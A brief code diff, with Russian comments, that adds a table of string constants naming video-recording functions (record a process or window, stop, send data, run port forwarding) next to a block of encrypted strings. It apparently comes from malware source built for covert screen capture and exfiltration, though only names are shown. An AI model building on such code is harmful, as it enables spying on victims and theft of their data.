@@ -54,6 +54,14 @@ CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 
 
 
+// Имена функций библиотеки видеозаписи.
+CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
+CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
+CSSTR VideRecFuncStop[]           = "StopRec";
+CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
+CSSTR VideRecFuncSendData[]       = "StartSend";
+CSSTR VideRecFuncRunPortForward[] = "RunPortForward";
+
 
 //=============================================================================
 // Конец блока шифрованных строк
